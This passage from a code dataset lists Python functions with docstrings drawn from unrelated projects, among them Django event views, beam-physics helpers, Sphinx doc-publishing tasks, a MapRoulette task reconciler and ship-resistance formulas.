            "def event_all_comments_list(request, slug):\n    \"\"\"\n    Returns a list view of all comments for a given event.\n    Combines event comments and update comments in one list.\n    \"\"\"\n    event = get_object_or_404(Event, slug=slug)\n    comments = event.all_comments\n    page = int(request.GET.get('page', 99999))  # feed empty page by default to push to last page\n    is_paginated = False\n    if comments:\n        paginator = Paginator(comments, 50)  # Show 50 comments per page\n        try:\n            comments = paginator.page(page)\n        except EmptyPage:\n            # If page is out of range (e.g. 9999), deliver last page of results.\n            comments = paginator.page(paginator.num_pages)\n        is_paginated = comments.has_other_pages()\n\n    return render(request, 'happenings/event_comments.html', {\n        \"event\": event,\n        \"comment_list\": comments,\n        \"object_list\": comments,\n        \"page_obj\": comments,\n        \"page\": page,\n        \"is_paginated\": is_paginated,\n        \"key\": key\n    })"
        ],
        [
            "def event_update_list(request, slug):\n    \"\"\"\n    Returns a list view of updates for a given event.\n    If the event is over, it will be in chronological order.\n    If the event is upcoming or still going,\n    it will be in reverse chronological order.\n    \"\"\"\n    event = get_object_or_404(Event, slug=slug)\n    updates = Update.objects.filter(event__slug=slug)\n    if event.recently_ended():\n        # if the event is over, use chronological order\n        updates = updates.order_by('id')\n    else:\n        # if not, use reverse chronological\n        updates = updates.order_by('-id')\n    return render(request, 'happenings/updates/update_list.html', {\n        'event': event,\n        'object_list': updates,\n    })"
        ],
        [
            "def video_list(request, slug):\n    \"\"\"\n    Displays list of videos for given event.\n    \"\"\"\n    event = get_object_or_404(Event, slug=slug)\n    return render(request, 'video/video_list.html', {\n        'event': event,\n        'video_list': event.eventvideo_set.all()\n    })"
        ],
        [
            "def add_event(request):\n    \"\"\" Public form to add an event. \"\"\"\n    form = AddEventForm(request.POST or None)\n    if form.is_valid():\n        instance = form.save(commit=False)\n        instance.sites = settings.SITE_ID\n        instance.submitted_by = request.user\n        instance.approved = True\n        instance.slug = slugify(instance.name)\n        instance.save()\n        messages.success(request, 'Your event has been added.')\n        return HttpResponseRedirect(reverse('events_index'))\n    return render(request, 'happenings/event_form.html', {\n        'form': form,\n        'form_title': 'Add an event'\n    })"
        ],
        [
            "def add_memory(request, slug):\n    \"\"\" Adds a memory to an event. \"\"\"\n    event = get_object_or_404(Event, slug=slug)\n    form = MemoryForm(request.POST or None, request.FILES or None)\n    if form.is_valid():\n        instance = form.save(commit=False)\n        instance.user = request.user\n        instance.event = event\n        instance.save()\n        msg = \"Your thoughts were added. \"\n\n        if request.FILES:\n            photo_list = request.FILES.getlist('photos')\n            photo_count = len(photo_list)\n            for upload_file in photo_list:\n                process_upload(upload_file, instance, form, event, request)\n            if photo_count > 1:\n                msg += \"{} images were added and should appear soon.\".format(photo_count)\n            else:\n                msg += \"{} image was added and should appear soon.\".format(photo_count)\n        messages.success(request, msg)\n        return HttpResponseRedirect('../')\n    return render(request, 'happenings/add_memories.html', {'form': form, 'event': event})"
        ],
        [
            "def __register_library(self, module_name: str, attr: str, fallback: str = None):\n        \"\"\"Inserts Interpreter Library of imports into sketch in a very non-consensual way\"\"\"\n\n        # Import the module Named in the string\n        try:\n            module = importlib.import_module(module_name)\n\n        # If module is not found it checks if an alternative is is listed\n        # If it is then it substitutes it, just so that the code can run\n        except ImportError:\n            if fallback is not None:\n                module = importlib.import_module(fallback)\n                self.__logger.warn(module_name + \" not available: Replaced with \" + fallback)\n            else:\n                self.__logger.warn(module_name + \" not available: No Replacement Specified\")\n\n        # Cram the module into the __sketch in the form of module -> \"attr\"\n        # AKA the same as `import module as attr`\n        if not attr in dir(self.__sketch):\n            setattr(self.__sketch, attr, module)\n        else:\n            self.__logger.warn(attr +\" could not be imported as it's label is already used in the sketch\")"
        ],
        [
            "def set_moments(self, sx, sxp, sxxp):\n        \"\"\"\n        Sets the beam moments directly.\n\n        Parameters\n        ----------\n        sx : float\n            Beam moment where :math:`\\\\text{sx}^2 = \\\\langle x^2 \\\\rangle`.\n        sxp : float\n            Beam moment where :math:`\\\\text{sxp}^2 = \\\\langle x'^2 \\\\rangle`.\n        sxxp : float\n            Beam moment where :math:`\\\\text{sxxp} = \\\\langle x x' \\\\rangle`.\n        \"\"\"\n        self._sx   = sx\n        self._sxp  = sxp\n        self._sxxp = sxxp\n        emit = _np.sqrt(sx**2 * sxp**2 - sxxp**2)\n        self._store_emit(emit=emit)"
        ],
        [
            "def set_Courant_Snyder(self, beta, alpha, emit=None, emit_n=None):\n        \"\"\"\n        Sets the beam moments indirectly using Courant-Snyder parameters.\n\n        Parameters\n        ----------\n        beta : float\n            Courant-Snyder parameter :math:`\\\\beta`.\n        alpha : float\n            Courant-Snyder parameter :math:`\\\\alpha`.\n        emit : float\n            Beam emittance :math:`\\\\epsilon`.\n        emit_n : float\n            Normalized beam emittance :math:`\\\\gamma \\\\epsilon`.\n        \"\"\"\n\n        self._store_emit(emit=emit, emit_n=emit_n)\n        \n        self._sx   = _np.sqrt(beta*self.emit)\n        self._sxp  = _np.sqrt((1+alpha**2)/beta*self.emit)\n        self._sxxp = -alpha*self.emit"
        ],
        [
            "def normalize_slice(slice_obj, length):\n    \"\"\"\n    Given a slice object, return appropriate values for use in the range function\n\n    :param slice_obj: The slice object or integer provided in the `[]` notation\n    :param length: For negative indexing we need to know the max length of the object.\n    \"\"\"\n    if isinstance(slice_obj, slice):\n        start, stop, step = slice_obj.start, slice_obj.stop, slice_obj.step\n        if start is None:\n            start = 0\n\n        if stop is None:\n            stop = length\n\n        if step is None:\n            step = 1\n\n        if start < 0:\n            start += length\n\n        if stop < 0:\n            stop += length\n    elif isinstance(slice_obj, int):\n        start = slice_obj\n        if start < 0:\n            start += length\n        stop = start + 1\n        step = 1\n    else:\n        raise TypeError\n\n    if (0 <= start <= length) and (0 <= stop <= length):\n        return start, stop, step\n\n    raise IndexError"
        ],
        [
            "def error(self, error_code, value, **kwargs):\n        \"\"\"\n        Helper to add error to messages field. It fills placeholder with extra call parameters\n        or values from message_value map.\n\n        :param error_code: Error code to use\n        :rparam error_code: str\n        :param value: Value checked\n        :param kwargs: Map of values to use in placeholders\n        \"\"\"\n        code = self.error_code_map.get(error_code, error_code)\n\n        try:\n            message = Template(self.error_messages[code])\n        except KeyError:\n            message = Template(self.error_messages[error_code])\n\n        placeholders = {\"value\": self.hidden_value if self.hidden else value}\n        placeholders.update(kwargs)\n        placeholders.update(self.message_values)\n\n        self.messages[code] = message.safe_substitute(placeholders)"
        ],
        [
            "def copy(src, dst):\n    \"\"\"File copy that support compress and decompress of zip files\"\"\"\n\n    (szip, dzip) = (src.endswith(\".zip\"), dst.endswith(\".zip\"))\n    logging.info(\"Copy: %s => %s\"%(src, dst))\n\n    if szip and dzip:#If both zipped, we can simply use copy\n        shutil.copy2(src, dst)\n    elif szip:\n        with zipfile.ZipFile(src, mode='r') as z:\n            tmpdir = tempfile.mkdtemp()\n            try:\n                z.extractall(tmpdir)\n                if len(z.namelist()) != 1:\n                    raise RuntimeError(\"The zip file '%s' should only have one \"\\\n                                       \"compressed file\"%src)\n                tmpfile = join(tmpdir,z.namelist()[0])\n                try:\n                    os.remove(dst)\n                except OSError:\n                    pass\n                shutil.move(tmpfile, dst)\n            finally:\n                shutil.rmtree(tmpdir, ignore_errors=True)\n    elif dzip:\n        with zipfile.ZipFile(dst, mode='w', compression=ZIP_DEFLATED) as z:\n            z.write(src, arcname=basename(src))\n    else:#None of them are zipped\n        shutil.copy2(src, dst)"
        ],
        [
            "def apply_changesets(args, changesets, catalog):\n    \"\"\"Apply to the 'catalog' the changesets in the metafile list 'changesets'\"\"\"\n\n    tmpdir = tempfile.mkdtemp()\n    tmp_patch = join(tmpdir, \"tmp.patch\")\n    tmp_lcat  = join(tmpdir, \"tmp.lcat\")\n\n    for node in changesets:\n        remove(tmp_patch)\n        copy(node.mfile['changeset']['filename'], tmp_patch)\n        logging.info(\"mv %s %s\"%(catalog, tmp_lcat))\n        shutil.move(catalog, tmp_lcat)\n\n        cmd = args.patch_cmd.replace(\"$in1\", tmp_lcat)\\\n                            .replace(\"$patch\", tmp_patch)\\\n                            .replace(\"$out\", catalog)\n        logging.info(\"Patch: %s\"%cmd)\n        subprocess.check_call(cmd, shell=True)\n\n    shutil.rmtree(tmpdir, ignore_errors=True)"
        ],
        [
            "def clean(self):\n        \"\"\"\n        Validate that an event with this name on this date does not exist.\n        \"\"\"\n        cleaned = super(EventForm, self).clean()\n        if Event.objects.filter(name=cleaned['name'], start_date=cleaned['start_date']).count():\n            raise forms.ValidationError(u'This event appears to be in the database already.')\n        return cleaned"
        ],
        [
            "def loop_in_background(interval, callback):\n    \"\"\"\n    When entering the context, spawns a greenlet that sleeps for `interval` seconds between `callback` executions.\n    When leaving the context stops the greenlet.\n    The yielded object is the `GeventLoop` object so the loop can be stopped from within the context.\n\n    For example:\n    ```\n    with loop_in_background(60.0, purge_cache) as purge_cache_job:\n        ...\n        ...\n        if should_stop_cache():\n            purge_cache_job.stop()\n    ```\n    \"\"\"\n    loop = GeventLoop(interval, callback)\n    loop.start()\n    try:\n        yield loop\n    finally:\n        if loop.has_started():\n            loop.stop()"
        ],
        [
            "def _loop(self):\n        \"\"\"Main loop - used internally.\"\"\"\n        while True:\n            try:\n                with uncaught_greenlet_exception_context():\n                    self._loop_callback()\n            except gevent.GreenletExit:\n                break\n            if self._stop_event.wait(self._interval):\n                break\n        self._clear()"
        ],
        [
            "def start(self):\n        \"\"\"\n        Starts the loop. Calling a running loop is an error.\n        \"\"\"\n        assert not self.has_started(), \"called start() on an active GeventLoop\"\n        self._stop_event = Event()\n        # note that we don't use safe_greenlets.spawn because we take care of it in _loop by ourselves\n        self._greenlet = gevent.spawn(self._loop)"
        ],
        [
            "def kill(self):\n        \"\"\"Kills the running loop and waits till it gets killed.\"\"\"\n        assert self.has_started(), \"called kill() on a non-active GeventLoop\"\n        self._stop_event.set()\n        self._greenlet.kill()\n        self._clear()"
        ],
        [
            "def NonUniformImage(x, y, z, ax=None, fig=None, cmap=None, alpha=None, scalex=True, scaley=True, add_cbar=True, **kwargs):\n    \"\"\"\n    Used to plot a set of coordinates.\n\n\n    Parameters\n    ----------\n    x, y : :class:`numpy.ndarray`\n        1-D ndarrays of lengths N and M, respectively, specifying pixel centers\n    z : :class:`numpy.ndarray`\n        An (M, N) ndarray or masked array of values to be colormapped, or a (M, N, 3) RGB array, or a (M, N, 4) RGBA array.\n    ax : :class:`matplotlib.axes.Axes`, optional\n        The axis to plot to.\n    fig : :class:`matplotlib.figure.Figure`, optional\n        The figure to plot to.\n    cmap : :class:`matplotlib.colors.Colormap`, optional\n        The colormap to use.\n    alpha : float, optional\n        The transparency to use.\n    scalex : bool, optional\n        To set the x limits to available data\n    scaley : bool, optional\n        To set the y limits to available data\n    add_cbar : bool, optional\n        Whether ot add a colorbar or not.\n\n    Returns\n    -------\n    img : :class:`matplotlib.image.NonUniformImage`\n        Object representing the :class:`matplotlib.image.NonUniformImage`.\n    \"\"\"\n    if ax is None and fig is None:\n        fig, ax = _setup_axes()\n    elif ax is None:\n        ax = fig.gca()\n    elif fig is None:\n        fig = ax.get_figure()\n\n    norm = kwargs.get('norm', None)\n\n    im = _mplim.NonUniformImage(ax, **kwargs)\n\n    vmin = kwargs.pop('vmin', _np.min(z))\n    vmax = kwargs.pop('vmax', _np.max(z))\n    # im.set_clim(vmin=vmin, vmax=vmax)\n\n    if cmap is not None:\n        im.set_cmap(cmap)\n\n    m = _cm.ScalarMappable(cmap=im.get_cmap(), norm=norm)\n    m.set_array(z)\n\n    if add_cbar:\n        cax, cb = _cb(ax=ax, im=m, fig=fig)\n\n    if alpha is not None:\n        im.set_alpha(alpha)\n\n    im.set_data(x, y, z)\n    ax.images.append(im)\n\n    if scalex:\n        xmin = min(x)\n        xmax = max(x)\n        ax.set_xlim(xmin, xmax)\n\n    if scaley:\n        ymin = min(y)\n        ymax = max(y)\n        ax.set_ylim(ymin, ymax)\n\n    return _SI(im=im, cb=cb, cax=cax)"
        ],
        [
            "def _sentence_to_interstitial_spacing(self):\n        \"\"\"Fix common spacing errors caused by LaTeX's habit\n        of using an inter-sentence space after any full stop.\"\"\"\n\n        not_sentence_end_chars = [' ']\n        abbreviations = ['i.e.', 'e.g.', ' v.',\n            ' w.', ' wh.']\n        titles = ['Prof.', 'Mr.', 'Mrs.', 'Messrs.',\n            'Mmes.', 'Msgr.', 'Ms.', 'Fr.', 'Rev.',\n            'St.', 'Dr.', 'Lieut.', 'Lt.', 'Capt.',\n            'Cptn.', 'Sgt.', 'Sjt.', 'Gen.', 'Hon.',\n            'Cpl.', 'L-Cpl.', 'Pvt.', 'Dvr.', 'Gnr.',\n            'Spr.', 'Col.', 'Lt-Col', 'Lt-Gen.', 'Mx.']\n\n        for abbrev in abbreviations:\n            for x in not_sentence_end_chars:\n                self._str_replacement(abbrev + x, abbrev + '\\ ')\n\n        for title in titles:\n            for x in not_sentence_end_chars:\n                self._str_replacement(title + x, title + '~')"
        ],
        [
            "def _hyphens_to_dashes(self):\n      \"\"\"Transform hyphens to various kinds of dashes\"\"\"\n\n      problematic_hyphens = [(r'-([.,!)])', r'---\\1'),\n                             (r'(?<=\\d)-(?=\\d)', '--'),\n                             (r'(?<=\\s)-(?=\\s)', '---')]\n\n      for problem_case in problematic_hyphens:\n          self._regex_replacement(*problem_case)"
        ],
        [
            "def _str_replacement(self, target, replacement):\n      \"\"\"Replace target with replacement\"\"\"\n      self.data = self.data.replace(target, replacement)"
        ],
        [
            "def _regex_replacement(self, target, replacement):\n      \"\"\"Regex substitute target with replacement\"\"\"\n      match = re.compile(target)\n      self.data = match.sub(replacement, self.data)"
        ],
        [
            "def sphinx_make(*targets):\n    \"\"\"Call the Sphinx Makefile with the specified targets.\n\n    `options.paved.docs.path`: the path to the Sphinx folder (where the Makefile resides).\n    \"\"\"\n    sh('make %s' % ' '.join(targets), cwd=options.paved.docs.path)"
        ],
        [
            "def rsync_docs():\n    \"\"\"Upload the docs to a remote location via rsync.\n\n    `options.paved.docs.rsync_location`: the target location to rsync files to.\n\n    `options.paved.docs.path`: the path to the Sphinx folder (where the Makefile resides).\n\n    `options.paved.docs.build_rel`: the path of the documentation\n        build folder, relative to `options.paved.docs.path`.\n    \"\"\"\n    assert options.paved.docs.rsync_location, \"Please specify an rsync location in options.paved.docs.rsync_location.\"\n    sh('rsync -ravz %s/ %s/' % (path(options.paved.docs.path) / options.paved.docs.build_rel,\n                                options.paved.docs.rsync_location))"
        ],
        [
            "def ghpages():\n    '''Push Sphinx docs to github_ gh-pages branch.\n\n     1. Create file .nojekyll\n     2. Push the branch to origin/gh-pages\n        after committing using ghp-import_\n\n    Requirements:\n     - easy_install ghp-import\n\n    Options:\n     - `options.paved.docs.*` is not used\n     - `options.sphinx.docroot` is used (default=docs)\n     - `options.sphinx.builddir` is used (default=.build)\n\n    .. warning::\n        This will DESTROY your gh-pages branch.\n        If you love it, you'll want to take backups\n        before playing with this. This script assumes\n        that gh-pages is 100% derivative. You should\n        never edit files in your gh-pages branch by hand\n        if you're using this script because you will\n        lose your work.\n\n    .. _github: https://github.com\n    .. _ghp-import: https://github.com/davisp/ghp-import\n    '''\n\n    # copy from paver\n    opts = options\n    docroot = path(opts.get('docroot', 'docs'))\n    if not docroot.exists():\n        raise BuildFailure(\"Sphinx documentation root (%s) does not exist.\"\n                           % docroot)\n    builddir = docroot / opts.get(\"builddir\", \".build\")\n    # end of copy\n\n    builddir=builddir / 'html'\n    if not builddir.exists():\n        raise BuildFailure(\"Sphinx build directory (%s) does not exist.\"\n                           % builddir)\n\n    nojekyll = path(builddir) / '.nojekyll'\n    nojekyll.touch()\n\n    sh('ghp-import -p %s' % (builddir))"
        ],
        [
            "def showhtml():\n    \"\"\"Open your web browser and display the generated html documentation.\n    \"\"\"\n    import webbrowser\n\n    # copy from paver\n    opts = options\n    docroot = path(opts.get('docroot', 'docs'))\n    if not docroot.exists():\n        raise BuildFailure(\"Sphinx documentation root (%s) does not exist.\"\n                           % docroot)\n    builddir = docroot / opts.get(\"builddir\", \".build\")\n    # end of copy\n\n    builddir=builddir / 'html'\n    if not builddir.exists():\n        raise BuildFailure(\"Sphinx build directory (%s) does not exist.\"\n                           % builddir)\n\n    webbrowser.open(builddir / 'index.html')"
        ],
        [
            "def minify(self, css):\n      \"\"\"Tries to minimize the length of CSS code passed as parameter. Returns string.\"\"\"\n      css = css.replace(\"\\r\\n\", \"\\n\") # get rid of Windows line endings, if they exist\n      for rule in _REPLACERS[self.level]:\n          css = re.compile(rule[0], re.MULTILINE|re.UNICODE|re.DOTALL).sub(rule[1], css)\n      return css"
        ],
        [
            "def get_or_create_index(self, index_ratio, index_width):\n        \"\"\"Return an open file-object to the index file\"\"\"\n        if not self.index_path.exists() or not self.filepath.stat().st_mtime == self.index_path.stat().st_mtime:\n            create_index(self.filepath, self.index_path, index_ratio=index_ratio, index_width=index_width)\n        return IndexFile(str(self.index_path))"
        ],
        [
            "def create(self, server):\n        \"\"\"Create the tasks on the server\"\"\"\n        for chunk in self.__cut_to_size():\n            server.post(\n                'tasks_admin',\n                chunk.as_payload(),\n                replacements={\n                    'slug': chunk.challenge.slug})"
        ],
        [
            "def update(self, server):\n        \"\"\"Update existing tasks on the server\"\"\"\n        for chunk in self.__cut_to_size():\n            server.put(\n                'tasks_admin',\n                chunk.as_payload(),\n                replacements={\n                    'slug': chunk.challenge.slug})"
        ],
        [
            "def reconcile(self, server):\n        \"\"\"\n        Reconcile this collection with the server.\n        \"\"\"\n        if not self.challenge.exists(server):\n            raise Exception('Challenge does not exist on server')\n\n        existing = MapRouletteTaskCollection.from_server(server, self.challenge)\n\n        same = []\n        new = []\n        changed = []\n        deleted = []\n\n        # reconcile the new tasks with the existing tasks:\n        for task in self.tasks:\n            # if the task exists on the server...\n            if task.identifier in [existing_task.identifier for existing_task in existing.tasks]:\n                # and they are equal...\n                if task == existing.get_by_identifier(task.identifier):\n                    # add to 'same' list\n                    same.append(task)\n                    # if they are not equal, add to 'changed' list\n                else:\n                    changed.append(task)\n            # if the task does not exist on the server, add to 'new' list\n            else:\n                new.append(task)\n\n        # next, check for tasks on the server that don't exist in the new collection...\n        for task in existing.tasks:\n            if task.identifier not in [task.identifier for task in self.tasks]:\n                # ... and add those to the 'deleted' list.\n                deleted.append(task)\n\n        # update the server with new, changed, and deleted tasks\n        if new:\n            newCollection = MapRouletteTaskCollection(self.challenge, tasks=new)\n            newCollection.create(server)\n        if changed:\n            changedCollection = MapRouletteTaskCollection(self.challenge, tasks=changed)\n            changedCollection.update(server)\n        if deleted:\n            deletedCollection = MapRouletteTaskCollection(self.challenge, tasks=deleted)\n            for task in deletedCollection.tasks:\n                task.status = 'deleted'\n            deletedCollection.update(server)\n        # return same, new, changed and deleted tasks\n        return {'same': same, 'new': new, 'changed': changed, 'deleted': deleted}"
        ],
        [
            "def yn_prompt(msg, default=True):\n    \"\"\"\n    Prompts the user for yes or no.\n    \"\"\"\n    ret = custom_prompt(msg, [\"y\", \"n\"], \"y\" if default else \"n\")\n    if ret == \"y\":\n        return True\n    return False"
        ],
        [
            "def custom_prompt(msg, options, default):\n    \"\"\"\n    Prompts the user with custom options.\n    \"\"\"\n    formatted_options = [\n        x.upper() if x == default else x.lower() for x in options\n    ]\n    sure = input(\"{0} [{1}]: \".format(msg, \"/\".join(formatted_options)))\n    if len(sure) == 0:\n        return default\n    for option in options:\n        if sure.upper() == option.upper():\n            return option\n    return default"
        ],
        [
            "def read(args):\n    \"\"\"Reading the configure file and adds non-existing attributes to 'args'\"\"\"\n\n    if args.config_file is None or not isfile(args.config_file):\n        return\n\n    logging.info(\"Reading configure file: %s\"%args.config_file)\n\n    config = cparser.ConfigParser()\n    config.read(args.config_file)\n    if not config.has_section('lrcloud'):\n        raise RuntimeError(\"Configure file has no [lrcloud] section!\")\n\n    for (name, value) in config.items('lrcloud'):\n        if value == \"True\":\n            value = True\n        elif value == \"False\":\n            value = False\n        if getattr(args, name) is None:\n            setattr(args, name, value)"
        ],
        [
            "def write(args):\n    \"\"\"Writing the configure file with the attributes in 'args'\"\"\"\n\n    logging.info(\"Writing configure file: %s\"%args.config_file)\n    if args.config_file is None:\n        return\n\n    #Let's add each attribute of 'args' to the configure file\n    config = cparser.ConfigParser()\n    config.add_section(\"lrcloud\")\n    for p in [x for x in dir(args) if not x.startswith(\"_\")]:\n        if p in IGNORE_ARGS:\n            continue#We ignore some attributes\n        value = getattr(args, p)\n        if value is not None:\n            config.set('lrcloud', p, str(value))\n\n    with open(args.config_file, 'w') as f:\n        config.write(f)"
        ],
        [
            "def new(self, mode):\n        \"\"\"\n        Create a new instance of a game. Note, a mode MUST be provided and MUST be of\n        type GameMode.\n\n        :param mode: <required>\n\n        \"\"\"\n        dw = DigitWord(wordtype=mode.digit_type)\n        dw.random(mode.digits)\n\n        self._key = str(uuid.uuid4())\n        self._status = \"\"\n        self._ttl = 3600\n        self._answer = dw\n        self._mode = mode\n        self._guesses_remaining = mode.guesses_allowed\n        self._guesses_made = 0"
        ],
        [
            "def bump(self, target):\n        \"\"\"\n        Bumps the Version given a target\n\n        The target can be either MAJOR, MINOR or PATCH\n        \"\"\"\n        if target == 'patch':\n            return Version(self.major, self.minor, self.patch + 1)\n        if target == 'minor':\n            return Version(self.major, self.minor + 1, 0)\n        if target == 'major':\n            return Version(self.major + 1, 0, 0)\n        return self.clone()"
        ],
        [
            "def clone(self):\n        \"\"\"\n        Returns a copy of this object\n        \"\"\"\n        t = Tag(self.version.major, self.version.minor, self.version.patch)\n        if self.revision is not None:\n            t.revision = self.revision.clone()\n        return t"
        ],
        [
            "def with_revision(self, label, number):\n        \"\"\"\n        Returns a Tag with a given revision\n        \"\"\"\n        t = self.clone()\n        t.revision = Revision(label, number)\n        return t"
        ],
        [
            "def parse(s):\n        \"\"\"\n        Parses a string into a Tag\n        \"\"\"\n        try:\n            m = _regex.match(s)\n            t = Tag(int(m.group('major')),\n                    int(m.group('minor')),\n                    int(m.group('patch')))\n            return t \\\n                    if m.group('label') is None \\\n                    else t.with_revision(m.group('label'), int(m.group('number')))\n        except AttributeError:\n            return None"
        ],
        [
            "def tile():\n    \"\"\"Tiles open figures.\"\"\"\n\n    figs = plt.get_fignums()\n\n    # Keep track of x, y, size for figures\n    x       = 0\n    y       = 0\n    # maxy    = 0\n    toppad  = 21\n\n    size = np.array([0, 0])\n\n    if ( len(figs) != 0 ):\n        fig     = plt.figure(figs[0])\n        screen  = fig.canvas.window.get_screen()\n        screenx = screen.get_monitor_geometry(screen.get_primary_monitor())\n        screenx = screenx[2]\n    \n        fig = plt.figure(figs[0])\n        fig.canvas.manager.window.move(x, y)\n        maxy = np.array(fig.canvas.manager.window.get_position())[1]\n        size = np.array(fig.canvas.manager.window.get_size())\n        y    = maxy\n        x += size[0]+1\n    \n        for fig in figs[1:]:\n            fig  = plt.figure(fig)\n            size = np.array(fig.canvas.manager.window.get_size())\n            if ( x+size[0] > screenx ):\n                x    = 0\n                y    = maxy\n                maxy = y+size[1]+toppad\n            else:\n                maxy = max(maxy, y+size[1]+toppad)\n            fig.canvas.manager.window.move(x, y)\n            x += size[0] + 1"
        ],
        [
            "def update_time(sender, **kwargs):\n    \"\"\"\n    When a Comment is added, updates the Update to set \"last_updated\" time\n    \"\"\"\n    comment = kwargs['instance']\n    if comment.content_type.app_label == \"happenings\" and comment.content_type.name == \"Update\":\n        from .models import Update\n        item = Update.objects.get(id=comment.object_pk)\n        item.save()"
        ],
        [
            "def extra_context(request):\n    \"\"\"Adds useful global items to the context for use in templates.\n\n    * *request*: the request object\n    * *HOST*: host name of server\n    * *IN_ADMIN*: True if you are in the django admin area\n    \"\"\"\n    host = os.environ.get('DJANGO_LIVE_TEST_SERVER_ADDRESS', None) \\\n        or request.get_host()\n    d = {\n        'request':request,\n        'HOST':host,\n        'IN_ADMIN':request.path.startswith('/admin/'),\n    }\n\n    return d"
        ],
        [
            "def create(self, server):\n        \"\"\"Create the challenge on the server\"\"\"\n\n        return server.post(\n            'challenge_admin',\n            self.as_payload(),\n            replacements={'slug': self.slug})"
        ],
        [
            "def update(self, server):\n        \"\"\"Update existing challenge on the server\"\"\"\n\n        return server.put(\n            'challenge_admin',\n            self.as_payload(),\n            replacements={'slug': self.slug})"
        ],
        [
            "def exists(self, server):\n        \"\"\"Check if a challenge exists on the server\"\"\"\n\n        try:\n            server.get(\n                'challenge',\n                replacements={'slug': self.slug})\n        except Exception:\n            return False\n        return True"
        ],
        [
            "def get_position(self, position_id):\n        \"\"\"\n        Returns position data.\n\n        http://dev.wheniwork.com/#get-existing-position\n        \"\"\"\n        url = \"/2/positions/%s\" % position_id\n\n        return self.position_from_json(self._get_resource(url)[\"position\"])"
        ],
        [
            "def get_positions(self):\n        \"\"\"\n        Returns a list of positions.\n\n        http://dev.wheniwork.com/#listing-positions\n        \"\"\"\n        url = \"/2/positions\"\n\n        data = self._get_resource(url)\n        positions = []\n        for entry in data['positions']:\n            positions.append(self.position_from_json(entry))\n\n        return positions"
        ],
        [
            "def create_position(self, params={}):\n        \"\"\"\n        Creates a position\n\n        http://dev.wheniwork.com/#create-update-position\n        \"\"\"\n        url = \"/2/positions/\"\n        body = params\n\n        data = self._post_resource(url, body)\n        return self.position_from_json(data[\"position\"])"
        ],
        [
            "def sloccount():\n    '''Print \"Source Lines of Code\" and export to file.\n\n    Export is hudson_ plugin_ compatible: sloccount.sc\n\n    requirements:\n     - sloccount_ should be installed.\n     - tee and pipes are used\n\n    options.paved.pycheck.sloccount.param\n\n    .. _sloccount: http://www.dwheeler.com/sloccount/\n    .. _hudson: http://hudson-ci.org/\n    .. _plugin: http://wiki.hudson-ci.org/display/HUDSON/SLOCCount+Plugin\n    '''\n\n    # filter out  subpackages\n    setup = options.get('setup')\n    packages = options.get('packages') if setup else None\n\n    if packages:\n        dirs = [x for x in packages if '.' not in x]\n    else:\n        dirs = ['.']\n\n    # sloccount has strange behaviour with directories,\n    # can cause exception in hudson sloccount plugin.\n    # Better to call it with file list\n    ls=[]\n    for d in dirs:\n        ls += list(path(d).walkfiles())\n    #ls=list(set(ls))\n    files=' '.join(ls)\n    param=options.paved.pycheck.sloccount.param\n    sh('sloccount {param} {files} | tee sloccount.sc'.format(param=param, files=files))"
        ],
        [
            "def pyflakes():\n    '''passive check of python programs by pyflakes.\n\n    requirements:\n     - pyflakes_ should be installed. ``easy_install pyflakes``\n\n    options.paved.pycheck.pyflakes.param\n\n    .. _pyflakes: http://pypi.python.org/pypi/pyflakes\n    '''\n\n    # filter out  subpackages\n    packages = [x for x in options.setup.packages if '.' not in x]\n\n    sh('pyflakes {param} {files}'.format(param=options.paved.pycheck.pyflakes.param, files=' '.join(packages)))"
        ],
        [
            "def http_exception_error_handler(\n        exception):\n    \"\"\"\n    Handle HTTP exception\n\n    :param werkzeug.exceptions.HTTPException exception: Raised exception\n\n    A response is returned, as formatted by the :py:func:`response` function.\n    \"\"\"\n\n    assert issubclass(type(exception), HTTPException), type(exception)\n    assert hasattr(exception, \"code\")\n    assert hasattr(exception, \"description\")\n\n    return response(exception.code, exception.description)"
        ],
        [
            "def is_colour(value):\n    \"\"\"Returns True if the value given is a valid CSS colour, i.e. matches one\n    of the regular expressions in the module or is in the list of\n    predetefined values by the browser.\n    \"\"\"\n    global PREDEFINED, HEX_MATCH, RGB_MATCH, RGBA_MATCH, HSL_MATCH, HSLA_MATCH\n    value = value.strip()\n\n    # hex match\n    if HEX_MATCH.match(value) or RGB_MATCH.match(value) or \\\n            RGBA_MATCH.match(value) or HSL_MATCH.match(value) or \\\n            HSLA_MATCH.match(value) or value in PREDEFINED:\n        return True\n\n    return False"
        ],
        [
            "def reynolds_number(length, speed, temperature=25):\n    \"\"\"\n    Reynold number utility function that return Reynold number for vehicle at specific length and speed.\n    Optionally, it can also take account of temperature effect of sea water.\n\n        Kinematic viscosity from: http://web.mit.edu/seawater/2017_MIT_Seawater_Property_Tables_r2.pdf\n\n    :param length: metres length of the vehicle\n    :param speed: m/s speed of the vehicle\n    :param temperature: degree C \n    :return: Reynolds number of the vehicle (dimensionless)\n    \"\"\"\n    kinematic_viscosity = interpolate.interp1d([0, 10, 20, 25, 30, 40],\n                                               np.array([18.54, 13.60, 10.50, 9.37, 8.42, 6.95]) / 10 ** 7)\n    # Data from http://web.mit.edu/seawater/2017_MIT_Seawater_Property_Tables_r2.pdf\n    Re = length * speed / kinematic_viscosity(temperature)\n    return Re"
        ],
        [
            "def froude_number(speed, length):\n    \"\"\"\n    Froude number utility function that return Froude number for vehicle at specific length and speed.\n\n    :param speed: m/s speed of the vehicle\n    :param length: metres length of the vehicle\n    :return: Froude number of the vehicle (dimensionless)\n    \"\"\"\n    g = 9.80665  # conventional standard value m/s^2\n    Fr = speed / np.sqrt(g * length)\n    return Fr"
        ],
        [
            "def residual_resistance_coef(slenderness, prismatic_coef, froude_number):\n    \"\"\"\n    Residual resistance coefficient estimation from slenderness function, prismatic coefficient and Froude number.\n\n    :param slenderness: Slenderness coefficient dimensionless :math:`L/(\u2207^{1/3})` where L is length of ship, \u2207 is displacement\n    :param prismatic_coef: Prismatic coefficient dimensionless :math:`\u2207/(L\\cdot A_m)` where L is length of ship, \u2207 is displacement Am is midsection area of the ship\n    :param froude_number: Froude number of the ship dimensionless \n    :return: Residual resistance of the ship\n    \"\"\"\n    Cr = cr(slenderness, prismatic_coef, froude_number)\n    if math.isnan(Cr):\n        Cr = cr_nearest(slenderness, prismatic_coef, froude_number)\n\n    # if Froude number is out of interpolation range, nearest extrapolation is used\n    return Cr"
        ],
        [
